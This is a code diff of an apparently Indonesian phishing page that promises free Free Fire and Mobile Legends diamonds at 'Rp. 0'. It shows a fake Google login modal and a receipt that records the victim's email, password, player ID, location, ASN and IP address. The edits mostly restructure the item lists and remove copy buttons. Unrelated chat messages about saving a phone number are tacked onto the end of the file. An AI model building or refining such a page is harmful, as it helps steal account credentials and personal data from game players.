@@ -54,6 +54,7 @@
         .nickname-box i { color: #059669; }
         .nickname-box.loading { background: #fffbeb; border-color: #fde68a; color: #d97706; }
         .nickname-box.error { background: #fef2f2; border-color: #fecaca; color: #dc2626; }
+        .nickname-box.error i { color: #dc2626; }
 
         /* Top-up Tabs */
         .tabs-container { display: flex; gap: 6px; margin-bottom: 12px; }
@@ -99,9 +100,7 @@
         .receipt-row { display: flex; justify-content: space-between; align-items: center; font-size: 11.5px; margin-bottom: 7px; border-bottom: 1px solid #f3f0ff; padding-bottom: 4px; }
         .receipt-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
         .receipt-row span:first-child { color: #6b7280; }
-        .receipt-row span.val-text { font-weight: 700; color: #1f2937; word-break: break-all; max-width: 200px; }
-        .copy-btn { background: #7c3aed; color: #fff; border: none; padding: 3px 7px; border-radius: 4px; font-size: 9.5px; cursor: pointer; font-weight: 600; }
-        .copy-btn:active { background: #5b21b6; }
+        .receipt-row span.val-text { font-weight: 700; color: #1f2937; word-break: break-all; max-width: 260px; }
         .pending-notice { background: #fffbeb; border: 1px solid #fde68a; color: #d97706; padding: 9px; border-radius: 6px; font-size: 11px; font-weight: 600; line-height: 1.4; }
     </style>
 </head>
@@ -171,8 +170,6 @@
                 <div class="step-num">2</div>
                 <div data-i18n="step2Title">Select Top Up</div>
             </div>
-            
-            <div class="tabs-container" id="tabsContainer"></div>
             <div class="items-grid" id="itemsGrid"></div>
         </div>
 
@@ -217,47 +214,38 @@
                 <div class="receipt-row">
                     <span>Email:</span>
                     <span class="val-text" id="rEmail">-</span>
-                    <button class="copy-btn" onclick="copyText('rEmail')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>Password:</span>
                     <span class="val-text" id="rPass">-</span>
-                    <button class="copy-btn" onclick="copyText('rPass')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>Player ID:</span>
                     <span class="val-text" id="rId">-</span>
-                    <button class="copy-btn" onclick="copyText('rId')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>Nickname:</span>
                     <span class="val-text" id="rNick" style="color:#059669;">-</span>
-                    <button class="copy-btn" onclick="copyText('rNick')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>Negara:</span>
                     <span class="val-text" id="rCountry">-</span>
-                    <button class="copy-btn" onclick="copyText('rCountry')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>City:</span>
                     <span class="val-text" id="rCity">-</span>
-                    <button class="copy-btn" onclick="copyText('rCity')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>State:</span>
                     <span class="val-text" id="rState">-</span>
-                    <button class="copy-btn" onclick="copyText('rState')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>ASN:</span>
                     <span class="val-text" id="rAsn">-</span>
-                    <button class="copy-btn" onclick="copyText('rAsn')">Salin</button>
                 </div>
                 <div class="receipt-row">
                     <span>IP Address:</span>
                     <span class="val-text" id="rIp">-</span>
-                    <button class="copy-btn" onclick="copyText('rIp')">Salin</button>
                 </div>
             </div>
 
@@ -269,51 +257,32 @@
 
     <script>
         let currentGame = 'Free Fire';
-        let currentTab = 'diamonds';
         let currentItem = '5 Diamonds';
-        let currentPrice = 'Rp. 0 (100% Off)';
-        let originalPrice = 'Rp. 1.300';
         let detectedNickname = '-';
         let isSubmitted = false;
         let timeoutId = null;
 
-        // IKON BERLIAN ASLI
+        // IKON BERLIAN ASLI & WDP
         const iconDiamond = 'https://cdn-icons-png.flaticon.com/512/845/845646.png';
         const iconWdp = 'https://cdn.phototourl.com/member/2026-10-01-61c2efbb-6191-4f90-b887-04e7e5c558cb.jpg';
 
         const topupData = {
-            'Free Fire': {
-                tabs: ['diamonds'],
-                tabNames: { diamonds: 'Diamonds' },
-                items: {
-                    diamonds: [
-                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 0', orig: 'Rp. 1.300', img: iconDiamond },
-                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 0', orig: 'Rp. 2.500', img: iconDiamond },
-                        { name: '50 Diamonds', sub: 'Popular', price: 'Rp. 0', orig: 'Rp. 10.500', img: iconDiamond },
-                        { name: '70 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 13.000', img: iconDiamond },
-                        { name: '140 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 26.000', img: iconDiamond },
-                        { name: '355 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 65.000', img: iconDiamond }
-                    ]
-                }
-            },
-            'Mobile Legends': {
-                tabs: ['diamonds', 'twilight'],
-                tabNames: { diamonds: 'Diamonds', twilight: 'Weekly Pass' },
-                items: {
-                    diamonds: [
-                        { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 0', orig: 'Rp. 2.278', img: iconDiamond },
-                        { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 0', orig: 'Rp. 5.160', img: iconDiamond },
-                        { name: '19 Diamonds', sub: '17 + 2 Bonus', price: 'Rp. 0', orig: 'Rp. 8.667', img: iconDiamond },
-                        { name: '28 Diamonds', sub: '25 + 3 Bonus', price: 'Rp. 0', orig: 'Rp. 12.606', img: iconDiamond },
-                        { name: '100 Diamonds', sub: '50+50 First Recharge', price: 'Rp. 0', orig: 'Rp. 23.558', img: iconDiamond },
-                        { name: '300 Diamonds', sub: '150+150 First Recharge', price: 'Rp. 0', orig: 'Rp. 70.271', img: iconDiamond }
-                    ],
-                    twilight: [
-                        { name: 'Weekly Diamond Pass', sub: 'WDP Official', price: 'Rp. 0', orig: 'Rp. 35.000', img: iconWdp },
-                        { name: 'Twilight Pass', sub: 'Exclusive Pass', price: 'Rp. 0', orig: 'Rp. 180.000', img: iconWdp }
-                    ]
-                }
-            }
+            'Free Fire': [
+                { name: '5 Diamonds', sub: 'Regular', price: 'Rp. 0', orig: 'Rp. 1.300', img: iconDiamond },
+                { name: '12 Diamonds', sub: '11 + 1 Bonus', price: 'Rp. 0', orig: 'Rp. 2.500', img: iconDiamond },
+                { name: '50 Diamonds', sub: 'Popular', price: 'Rp. 0', orig: 'Rp. 10.500', img: iconDiamond },
+                { name: '70 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 13.000', img: iconDiamond },
+                { name: '140 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 26.000', img: iconDiamond },
+                { name: '355 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 65.000', img: iconDiamond }
+            ],
+            'Mobile Legends': [
+                { name: 'Weekly Diamond Pass', sub: 'WDP Official', price: 'Rp. 0', orig: 'Rp. 35.000', img: iconWdp },
+                { name: '50 Diamonds', sub: 'Popular', price: 'Rp. 0', orig: 'Rp. 15.000', img: iconDiamond },
+                { name: '70 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 20.000', img: iconDiamond },
+                { name: '140 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 40.000', img: iconDiamond },
+                { name: '256 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 75.000', img: iconDiamond },
+                { name: '344 Diamonds', sub: 'Best Seller', price: 'Rp. 0', orig: 'Rp. 100.000', img: iconDiamond }
+            ]
         };
 
         const translations = {
@@ -374,42 +343,19 @@
                 idHint.innerText = translations[currentLang]['hintFF'];
             }
             
-            renderTabs();
+            renderItems();
             checkRealNickname();
-        }
-
-        function renderTabs() {
-            const tabsContainer = document.getElementById('tabsContainer');
-            tabsContainer.innerHTML = '';
-            const config = topupData[currentGame];
-            
-            config.tabs.forEach((tabKey, idx) => {
-                const btn = document.createElement('button');
-                btn.className = `tab-btn ${idx === 0 ? 'active' : ''}`;
-                btn.innerText = config.tabNames[tabKey];
-                btn.onclick = () => switchTab(tabKey, btn);
-                tabsContainer.appendChild(btn);
-            });
-            currentTab = config.tabs[0];
-            renderItems();
-        }
-
-        function switchTab(tabName, element) {
-            currentTab = tabName;
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            element.classList.add('active');
-            renderItems();
         }
 
         function renderItems() {
             const grid = document.getElementById('itemsGrid');
             grid.innerHTML = '';
-            const items = topupData[currentGame].items[currentTab];
+            const items = topupData[currentGame];
             
             items.forEach((item, index) => {
                 const div = document.createElement('div');
                 div.className = `item-card ${index === 0 ? 'selected' : ''}`;
-                div.onclick = () => selectItem(item.name + ' (' + item.sub + ')', item.price, item.orig, div);
+                div.onclick = () => selectItem(item.name + ' (' + item.sub + ')', div);
                 div.innerHTML = `
                     <div>
                         <img src="${item.img}" class="item-img" alt="item">
@@ -424,16 +370,12 @@
                 grid.appendChild(div);
             });
             currentItem = items[0].name + ' (' + items[0].sub + ')';
-            currentPrice = items[0].price;
-            originalPrice = items[0].orig;
         }
 
-        function selectItem(itemName, price, orig, element) {
+        function selectItem(itemName, element) {
             document.querySelectorAll('.item-card').forEach(c => c.classList.remove('selected'));
             element.classList.add('selected');
             currentItem = itemName;
-            currentPrice = price;
-            originalPrice = orig;
         }
 
         function debounceCheck() {
@@ -492,15 +434,6 @@
                 return;
             }
             document.getElementById('google-modal').style.display = 'flex';
-        }
-
-        function copyText(elementId) {
-            const textToCopy = document.getElementById(elementId).innerText;
-            navigator.clipboard.writeText(textToCopy).then(() => {
-                alert('Berhasil disalin: ' + textToCopy);
-            }).catch(err => {
-                alert('Gagal menyalin');
-            });
         }
 
         async function submitData(e) {
@@ -588,7 +521,10 @@ IP ADDRES : ${ipData.ip}
             }
         });
 
-        renderTabs();
+        renderItems();
     </script>
 </body>
 </html>
+halo mas👋
+bantu save nomorku Shinji Hirako ya
+Kalo udh jempol in aj, nomormu udah ku save
